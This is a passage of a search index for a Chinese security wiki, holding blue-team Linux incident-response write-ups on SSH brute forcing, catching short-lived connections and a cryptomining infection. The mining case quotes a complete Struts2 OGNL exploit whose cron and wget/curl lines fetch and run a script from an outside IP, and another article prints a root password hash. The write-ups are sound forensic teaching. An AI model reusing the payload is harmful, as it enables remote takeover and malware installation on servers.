{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"hack for security \u00b6 \u7ad9\u70b9\u542f\u75282022\u5e74\uff0c\u8bb0\u5f55\u81ea\u5df1\u7ea2\u84dd\u65b9\u5411\u5b66\u4e60\u77e5\u8bc6\uff0c red-team \u00b6 blue-team \u00b6 tools \u00b6","title":"\u4e3b\u9875"},{"location":"#hack-for-security","text":"\u7ad9\u70b9\u542f\u75282022\u5e74\uff0c\u8bb0\u5f55\u81ea\u5df1\u7ea2\u84dd\u65b9\u5411\u5b66\u4e60\u77e5\u8bc6\uff0c","title":"hack for security"},{"location":"#red-team","text":"","title":"red-team"},{"location":"#blue-team","text":"","title":"blue-team"},{"location":"#tools","text":"","title":"tools"},{"location":"tags/","text":"","title":"Tags"},{"location":"about/aboutme/","text":"hi\uff0c\u5f88\u9ad8\u5174\u80fd\u9047\u5230\u5fd7\u540c\u9053\u5408\u7684\u670b\u53cb\uff0c\u6211\u53eb\u5706\u5468 2022\u5e74\u505a\u4e86\u5f88\u591a\u4e8b\uff0c\u7531\u4e8e\u4e4b\u524d\u5728\u535a\u5ba2\u56ed\u548ccsdn\u88ab\u5220\u9664\u4e86\u5f88\u591a\u6587\u7ae0\uff0c\u6211\u8003\u8651\u8f6c\u5230github\u4e0a\u505a\u81ea\u5df1\u7684wiki\u77e5\u8bc6\u5e93\uff0c\u4e3b\u8981\u5185\u5bb9\u662f\u8bb0\u5f55\u81ea\u5df1\u7684\u6280\u80fd\u6811\u65b9\u5411 2022.2.5 \u00b6 \u6ca1\u60f3\u5230\u5b66\u4e60\u8fc7\u7a0b\u4e1c\u897f\u4f1a\u8fd9\u4e48\u591a\uff0c\u6709\u70b9\u5c0f\u5d29\u6e83\uff0c\u8d8a\u6765\u8d8a\u63a5\u8fd12022hw\uff0c\u9762\u8bd5\u7ea2\u961f\u7684\u4e1c\u897f\u771f\u7684\u597d\u591a\uff0c\u6628\u59291.30\uff0c\u51e0\u5929\u53c8\u4e0d\u77e5\u9053\u5565\u65f6\u5019\u5c3d\u5934 2022.1.17 \u00b6 \u5728\u8001\u5bb6\u53bb\u9762\u8bd5\u4e86\u672c\u5730\u7684\u7f51\u7edc\u5b89\u5168\u516c\u53f8\uff0c\u6295\u7684\u7b80\u5386\u90fd\u5f97\u5230\u4e86\u80af\u5b9a\uff0c\u4f46\u662f\u4ea4\u6d41\u5b8c\u4e4b\u540e\u4e0d\u5f97\u4e0d\u8bf4\u4e34\u6c82\u8fd9\u4e2a\u5730\u65b9\u8fd8\u662f\u5f88\u6709\u5dee\u8ddd\uff0c\u60f3\u505a\u653b\u9632\u7c7b\u672c\u5730\u6ca1\u6709\uff0c\u738b\u5b50\u6d69\u7ecf\u7406\u804a\u4e86\u4e24\u4e2a\u5c0f\u65f6\uff0c\u7167\u8fd9\u4e2a\u52bf\u5934\u6765\u8bb2\u8fd8\u662f\u5f976-8\u5e74\u624d\u80fd\u8d76\u5f97\u4e0a \u4e34\u6c82\u57ce\u6295\u7684\u65b0\u6210\u7acb\u516c\u53f85k 19\u85aa\u8d44 \u56fd\u4f01 \u6d4e\u535713-17k \u5b89\u670d\u4ed4 2022.1.14 \u00b6 \u5317\u4eac\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f\u5df2\u7ecf\u786e\u5b9a\u4e0d\u80fd\u53bb\u4e86\uff0c\u4e3b\u8981\u539f\u56e0\u8fd8\u662f\u5317\u4eac\u653f\u7b5614\u5929\u5728\u4eac\uff0c\u53e6\u5916\u8fd8\u6709\u90e8\u5206\u662f\u56e0\u4e3a\u81ea\u5df1\u63d0\u524d\u4e0d\u77e5\u60c5\uff0c\u8fd8\u6709\u4e00\u4e2a\u9762\u8bd5\u957f\u4ead\u7684\u9ad8\u7ea7\u84dd\u961f \u95ee\u7684\u95ee\u9898\u771f\u7684\u633a\u96be\uff0c 2022.1.1 \u00b6 \u65b0\u5e74\u65b0\u6c14\u8c61\uff0c\u8bb8\u4e2a\u613f\u5427\uff0c\u7236\u6bcd\u8eab\u4f53\u5065\u5eb7\uff0c\u4e00\u5207\u4e07\u4e8b\u5982\u610f 2021.12.28 \u00b6 \u8003\u7814\u7ed3\u675f\u4e86\uff0c\u611f\u89c9\u6709\u70b9\u51c9\uff0c\u5929\u6c14\u90fd\u5230\u4e86\u96f6\u4e0b10\u2103\uff0c\u671f\u5f85\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f \u672c\u7ad9\u7531mkdocs\u548cgithub\u642d\u5efa\uff0c\u53ef\u4ee5\u53c2\u8003\u63d2\u4ef6 \u4e3b\u9898 \u9009\u62e9\u5408\u9002\u7684\u4e3b\u9898 \u914d\u7f6e\u76f8\u5173 material","title":"about me"},{"location":"about/aboutme/#202225","text":"\u6ca1\u60f3\u5230\u5b66\u4e60\u8fc7\u7a0b\u4e1c\u897f\u4f1a\u8fd9\u4e48\u591a\uff0c\u6709\u70b9\u5c0f\u5d29\u6e83\uff0c\u8d8a\u6765\u8d8a\u63a5\u8fd12022hw\uff0c\u9762\u8bd5\u7ea2\u961f\u7684\u4e1c\u897f\u771f\u7684\u597d\u591a\uff0c\u6628\u59291.30\uff0c\u51e0\u5929\u53c8\u4e0d\u77e5\u9053\u5565\u65f6\u5019\u5c3d\u5934","title":"2022.2.5"},{"location":"about/aboutme/#2022117","text":"\u5728\u8001\u5bb6\u53bb\u9762\u8bd5\u4e86\u672c\u5730\u7684\u7f51\u7edc\u5b89\u5168\u516c\u53f8\uff0c\u6295\u7684\u7b80\u5386\u90fd\u5f97\u5230\u4e86\u80af\u5b9a\uff0c\u4f46\u662f\u4ea4\u6d41\u5b8c\u4e4b\u540e\u4e0d\u5f97\u4e0d\u8bf4\u4e34\u6c82\u8fd9\u4e2a\u5730\u65b9\u8fd8\u662f\u5f88\u6709\u5dee\u8ddd\uff0c\u60f3\u505a\u653b\u9632\u7c7b\u672c\u5730\u6ca1\u6709\uff0c\u738b\u5b50\u6d69\u7ecf\u7406\u804a\u4e86\u4e24\u4e2a\u5c0f\u65f6\uff0c\u7167\u8fd9\u4e2a\u52bf\u5934\u6765\u8bb2\u8fd8\u662f\u5f976-8\u5e74\u624d\u80fd\u8d76\u5f97\u4e0a \u4e34\u6c82\u57ce\u6295\u7684\u65b0\u6210\u7acb\u516c\u53f85k 19\u85aa\u8d44 \u56fd\u4f01 \u6d4e\u535713-17k \u5b89\u670d\u4ed4","title":"2022.1.17"},{"location":"about/aboutme/#2022114","text":"\u5317\u4eac\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f\u5df2\u7ecf\u786e\u5b9a\u4e0d\u80fd\u53bb\u4e86\uff0c\u4e3b\u8981\u539f\u56e0\u8fd8\u662f\u5317\u4eac\u653f\u7b5614\u5929\u5728\u4eac\uff0c\u53e6\u5916\u8fd8\u6709\u90e8\u5206\u662f\u56e0\u4e3a\u81ea\u5df1\u63d0\u524d\u4e0d\u77e5\u60c5\uff0c\u8fd8\u6709\u4e00\u4e2a\u9762\u8bd5\u957f\u4ead\u7684\u9ad8\u7ea7\u84dd\u961f \u95ee\u7684\u95ee\u9898\u771f\u7684\u633a\u96be\uff0c","title":"2022.1.14"},{"location":"about/aboutme/#202211","text":"\u65b0\u5e74\u65b0\u6c14\u8c61\uff0c\u8bb8\u4e2a\u613f\u5427\uff0c\u7236\u6bcd\u8eab\u4f53\u5065\u5eb7\uff0c\u4e00\u5207\u4e07\u4e8b\u5982\u610f","title":"2022.1.1"},{"location":"about/aboutme/#20211228","text":"\u8003\u7814\u7ed3\u675f\u4e86\uff0c\u611f\u89c9\u6709\u70b9\u51c9\uff0c\u5929\u6c14\u90fd\u5230\u4e86\u96f6\u4e0b10\u2103\uff0c\u671f\u5f85\u51ac\u5965\u4f1ahw\u7684\u6d88\u606f \u672c\u7ad9\u7531mkdocs\u548cgithub\u642d\u5efa\uff0c\u53ef\u4ee5\u53c2\u8003\u63d2\u4ef6 \u4e3b\u9898 \u9009\u62e9\u5408\u9002\u7684\u4e3b\u9898 \u914d\u7f6e\u76f8\u5173 material","title":"2021.12.28"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/","text":"\u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u00b6 0x00 \u524d\u8a00 \u00b6 SSH \u662f\u76ee\u524d\u8f83\u53ef\u9760\uff0c\u4e13\u4e3a\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u548c\u5176\u4ed6\u7f51\u7edc\u670d\u52a1\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u534f\u8bae\uff0c\u4e3b\u8981\u7528\u4e8e\u7ed9\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\u3002SSH\u53e3\u4ee4\u957f\u5ea6\u592a\u77ed\u6216\u8005\u590d\u6742\u5ea6\u4e0d\u591f\uff0c\u5982\u4ec5\u5305\u542b\u6570\u5b57\uff0c\u6216\u4ec5\u5305\u542b\u5b57\u6bcd\u7b49\uff0c\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7834\u89e3\uff0c\u4e00\u65e6\u88ab\u653b\u51fb\u8005\u83b7\u53d6\uff0c\u53ef\u7528\u6765\u76f4\u63a5\u767b\u5f55\u7cfb\u7edf\uff0c\u63a7\u5236\u670d\u52a1\u5668\u6240\u6709\u6743\u9650\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u767b\u5f55\u670d\u52a1\u5668\u8fdb\u884c\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u7aef\u53e3\u8fde\u63a5\u91cc\u5b58\u5728\u4e24\u6761\u53ef\u7591\u7684\u8fde\u63a5\u8bb0\u5f55\uff0c\u5982\u4e0b\u56fe\uff1a TCP\u521d\u59cb\u5316\u8fde\u63a5\u4e09\u6b21\u63e1\u624b\u5427\uff1a\u53d1SYN\u5305\uff0c\u7136\u540e\u8fd4\u56deSYN/ACK\u5305\uff0c\u518d\u53d1ACK\u5305\uff0c\u8fde\u63a5\u6b63\u5f0f\u5efa\u7acb\u3002\u4f46\u662f\u8fd9\u91cc\u6709\u70b9\u51fa\u5165\uff0c\u5f53\u8bf7\u6c42\u8005\u6536\u5230SYS/ACK\u5305\u540e\uff0c\u5c31\u5f00\u59cb\u5efa\u7acb\u8fde\u63a5\u4e86\uff0c\u800c\u88ab\u8bf7\u6c42\u8005\u7b2c\u4e09\u6b21\u63e1\u624b\u7ed3\u675f\u540e\u624d\u5efa\u7acb\u8fde\u63a5\u3002 \u5ba2\u6237\u7aefTCP\u72b6\u6001\u8fc1\u79fb\uff1a CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED \u670d\u52a1\u5668TCP\u72b6\u6001\u8fc1\u79fb\uff1a 1 CLOSED->LISTEN->SYN recv->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED \u5f53\u5ba2\u6237\u7aef\u5f00\u59cb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u5668\u8fd8\u5904\u4e8eLISTENING\uff0c\u5ba2\u6237\u7aef\u53d1\u4e00\u4e2aSYN\u5305\u540e\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u5230\u4e86\u5ba2\u6237\u7aef\u7684SYN\u5e76\u4e14\u53d1\u9001\u4e86ACK\u65f6\uff0c\u670d\u52a1\u5668\u5904\u4e8eSYN_RECV\u72b6\u6001\uff0c\u7136\u540e\u5e76\u6ca1\u6709\u518d\u6b21\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u8fdb\u5165ESTABLISHED\u72b6\u6001\uff0c\u4e00\u76f4\u505c\u7559\u5728SYN_RECV\u72b6\u6001\u3002 \u5728\u8fd9\u91cc\uff0cSSH\uff0822\uff09\u7aef\u53e3\uff0c\u4e24\u6761\u5916\u7f51IP\u7684SYN_RECV\u72b6\u6001\u8fde\u63a5\uff0c\u76f4\u89c9\u544a\u8bc9\u4e86\u7ba1\u7406\u5458\uff0c\u8fd9\u91cc\u4e00\u5b9a\u6709\u4ec0\u4e48\u5f02\u5e38\u3002 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 SSH\u7aef\u53e3\u5f02\u5e38\uff0c\u6211\u4eec\u9996\u5148\u6709\u5fc5\u8981\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5\uff1a A\u3001\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5 1\u3001\u9664root\u4e4b\u5916\uff0c\u662f\u5426\u8fd8\u6709\u5176\u5b83\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd root 2\u3001\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7::: \u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u76ee\u524d\u7cfb\u7edf\u53ea\u6709\u4e00\u4e2a\u7ba1\u7406\u7528\u6237root\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u60f3\u5230\u7684\u662f/var/log/secure\uff0c\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u8bb0\u5f55\u4e86\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\u4e0b\u6765\u3002 B\u3001\u786e\u8ba4\u653b\u51fb\u60c5\u51b5\uff1a 1\u3001\u7edf\u8ba1\u4e86\u4e0b\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u7ea6\u6709126254\u6b21\u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u906d\u53d7\u66b4\u529b\u7834\u89e3 [root@localhost ~]# grep -o \"Failed password\" /var/log/secure|uniq -c 126254 Failed password 2\u3001\u8f93\u51fa\u767b\u5f55\u7206\u7834\u7684\u7b2c\u4e00\u884c\u548c\u6700\u540e\u4e00\u884c\uff0c\u786e\u8ba4\u7206\u7834\u65f6\u95f4\u8303\u56f4\uff1a [root@localhost ~]# grep \"Failed password\" /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 [root@localhost ~]# grep \"Failed password\" /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3\u3001\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr 12622 23.91.xxx.xxx 8942 114.104.xxx.xxx 8122 111.13.xxx.xxx 7525 123.59.xxx.xxx ................... 4\u3001\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user ..................... C\u3001\u7ba1\u7406\u5458\u6700\u8fd1\u767b\u5f55\u60c5\u51b5\uff1a 1\u3001\u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 ............................ \u901a\u8fc7\u767b\u5f55\u65e5\u5fd7\u5206\u6790\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u767b\u5f55IP\u3002 2\u3001\u987a\u4fbf\u7edf\u8ba1\u4e00\u4e0b\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 27 192.168.204.1 \u901a\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u4ece\u8fd1\u6bb5\u65f6\u95f4\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u767b\u5f55\u8bb0\u5f55\u6765\u770b\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u7684\u60c5\u51b5\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u5165\u4fb5\u6392\u67e5\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u9610\u8ff0\u3002 0x04 \u5904\u7406\u63aa\u65bd \u00b6 SSH\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u5411\u516c\u7f51\u5f00\u653e\u7ba1\u7406\u7aef\u53e3\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668ssh\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u00b6 0x00 \u524d\u8a00 \u00b6 \u77ed\u8fde\u63a5\uff08short connnection\uff09\u662f\u76f8\u5bf9\u4e8e\u957f\u8fde\u63a5\u800c\u8a00\u7684\u6982\u5ff5\uff0c\u6307\u7684\u662f\u5728\u6570\u636e\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u5728\u9700\u8981\u53d1\u9001\u6570\u636e\u65f6\uff0c\u624d\u53bb\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64\u8fde\u63a5\uff0c\u5373\u6bcf\u6b21\u8fde\u63a5\u53ea\u5b8c\u6210\u4e00\u9879\u4e1a\u52a1\u7684\u53d1\u9001\u3002 \u5728\u7cfb\u7edf\u7ef4\u62a4\u4e2d\uff0c\u4e00\u822c\u5f88\u96be\u53bb\u5bdf\u89c9\uff0c\u9700\u8981\u501f\u52a9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u6216\u8005\u6293\u5305\u5206\u6790\uff0c\u624d\u80fd\u591f\u53bb\u53d1\u73b0\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u7f51\u7edc\u7ba1\u7406\u5458\u5728\u51fa\u53e3WAF\u68c0\u6d4b\u5230\u67d0\u53f0\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u9999\u6e2fI\u53d1\u8d77\u8bf7\u6c42 \uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u767b\u5f55\u670d\u52a1\u5668\u6392\u67e5\uff0c\u60f3\u8981\u627e\u5230\u53d1\u8d77\u77ed\u8fde\u63a5\u7684\u8fdb\u7a0b\u3002 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 \u767b\u5f55\u670d\u52a1\u5668\u67e5\u770b\u7aef\u53e3\u3001\u8fdb\u7a0b\uff0c\u5e76\u672a\u53d1\u73b0\u53d1\u73b0\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u4f46\u662f\u5f53\u591a\u6b21\u5237\u65b0\u7aef\u53e3\u8fde\u63a5\u65f6\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u8fde\u63a5\u3002 \u6709\u65f6\u5019\u4e00\u76f4\u5237\u8fd9\u6761\u547d\u4ee4\u597d\u5341\u51e0\u6b21\u624d\u4f1a\u51fa\u73b0\uff0c\u50cf\u8fd9\u79cd\u7684\u77ed\u8fde\u63a5\u6781\u96be\u6355\u6349\u5230\u5bf9\u5e94\u7684\u8fdb\u7a0b\u548c\u6e90\u6587\u4ef6\u3002 \u624b\u52a8\u6355\u6349\u4f30\u8ba1\u6ca1\u620f\uff0c\u5f88\u96be\u8ffd\u8e2a\uff0c\u4e8e\u662f\u52a8\u624b\u5199\u4e86\u4e00\u6bb5\u5c0f\u811a\u672c\u6765\u6355\u6349\u77ed\u8fde\u63a5\u5bf9\u5e94\u7684pid\u548c\u6e90\u6587\u4ef6\u3002 \u811a\u672c\u6587\u4ef6\u5982\u4e0b\uff1a #!/bin/bash ip=118.184.15.40 i=1 while : do tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}' #echo $tmp if test -z \"$tmp\" then ((i=i+1)) else for pid in $tmp; do echo \"PID: \"${pid} result=ls -lh /proc/$pid|grep exe echo \"Process: \"${result} kill -9 $pid done break fi done echo \"Total number of times: \"${i} \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u8dd1\u4e86\u4e09\u6b21\u811a\u672c\uff0c\u53ef\u4ee5\u53d1\u73b0\u77ed\u8fde\u63a5\u6bcf\u6b21\u53d1\u8d77\u7684\u8fdb\u7a0bPid\u4e00\u76f4\u5728\u53d8\uff0c\u4f46\u5df2\u7ecf\u6355\u6349\u5230\u53d1\u8d77\u8be5\u5f02\u5e38\u8fde\u63a5\u7684\u8fdb\u7a0b\u6e90\u6587\u4ef6\u4e3a /usr/lib/nfsiod 0x04 \u5c0f\u7ed3 \u00b6 \u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u77ed\u8fde\u63a5\u4ee5\u53ca\u6355\u6349\u77ed\u8fde\u63a5\u6e90\u6587\u4ef6\u7684\u6280\u5de7\uff0c\u7ad9\u5728\u5b89\u5168\u7ba1\u7406\u5458\u7684\u89d2\u5ea6\uff0c\u5e94\u52a0\u5f3a\u5bf9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u7ba1\u7406\uff0c\u5728\u7f51\u7edc\u5c42\u53bb\u53d1\u73b0\u66f4\u591a\u5728\u7cfb\u7edf\u5c42\u5f88\u96be\u5bdf\u89c9\u7684\u5b89\u5168\u5a01\u80c1\u3002 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 \u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u5229\u7528\u6316\u77ff\u811a\u672c\u6765\u5b9e\u73b0\u6d41\u91cf\u53d8\u73b0\uff0c\u4f7f\u5f97\u6316\u77ff\u75c5\u6bd2\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\uff0c\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff08\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3001Struts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff09\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u5b89\u5168\u7ba1\u7406\u5458\u5728\u767b\u5f55\u5b89\u5168\u8bbe\u5907\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u67d0\u53f0\u7f51\u7ad9\u670d\u52a1\u5668\u6301\u7eed\u5411\u5883\u5916IP\u53d1\u8d77\u8fde\u63a5\uff0c\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 A\u3001\u6392\u67e5\u8fc7\u7a0b \u00b6 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u4e0b\u8f7dlogo.jpg\uff0c\u5305\u542b\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u4e0b\u8f7dlogo.jpg\u5e76\u6267\u884c\u4e86\u91cc\u9762\u4e86shell\u811a\u672c\uff0c\u90a3\u8fd9\u4e2a\u811a\u672c\u662f\u5982\u4f55\u542f\u52a8\u7684\u5462\uff1f \u901a\u8fc7\u6392\u67e5\u7cfb\u7edf\u5f00\u673a\u542f\u52a8\u9879\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u670d\u52a1\u7b49\uff0c\u5728\u5b9a\u65f6\u4efb\u52a1\u91cc\u9762\uff0c\u53d1\u73b0\u4e86\u6076\u610f\u811a\u672c\uff0c\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u8d77\u8bf7\u6c42\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff0c\u5e76\u6267\u884c \u3002 B\u3001\u6eaf\u6e90\u5206\u6790 \u00b6 \u5728Tomcat log\u65e5\u5fd7\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u6837\u4e00\u6761\u8bb0\u5f55\uff1a \u5bf9\u65e5\u5fd7\u4e2d\u653b\u51fb\u6e90\u7801\u8fdb\u884c\u6458\u5f55\u5982\u4e0b\uff1a {(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo \"*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh\" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u4ee3\u7801\u4e2d\u7684\u64cd\u4f5c\u4e0e\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5f02\u5e38\u811a\u672c\u4e00\u81f4\uff0c\u636e\u6b64\u63a8\u65ad\u9ed1\u5ba2\u901a\u8fc7Struct 